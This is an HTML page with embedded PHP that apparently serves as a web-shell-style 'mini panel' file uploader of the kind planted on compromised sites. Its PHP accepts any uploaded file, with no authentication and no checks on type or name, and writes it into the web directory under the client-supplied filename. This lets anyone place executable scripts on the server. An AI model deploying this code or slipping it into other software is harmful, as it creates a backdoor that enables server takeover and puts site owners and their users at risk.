<head>
<style>
<!--
p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}-->
</style>
</head>

<title>&nbsp;Uploder File</title>
<body bgcolor="#000000">

<p align="center">&nbsp;</p>

<table style="BORDER-COLLAPSE: collapse" cellspacing="0" bordercolordark="#666666" cellpadding="5" height="1" width="100%" bgcolor="#000000" bordercolorlight="#c0c0c0" border="1">
	<tr>
		<a bookmark="minipanel" style="font-weight: normal; color: #009900; font-family: verdana; text-decoration: none">
		<td width="50%" height="1" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px">
		<center>Upload<form method="POST" enctype="multipart/form-data">
			<input type="hidden" name="act" value="upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900">
			<input type="file" name="userfile" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900" size="31"><input type="hidden" name="miniform" value="1" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900">
			<input type="submit" name="submit" value="Upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><br><br>
			<?php
$uploaddir = "";
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

if (isset($_FILES['userfile']['name'])) {
        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
                echo "The file ". basename($_FILES['userfile']['name']) ." has been uploaded";
        } else {
                echo "There was an error uploading the file. please try again!";
        }
}
?>
		</form>
		</center></td>
	</tr>
</table>
</a>
<p align="center">&nbsp;</p>


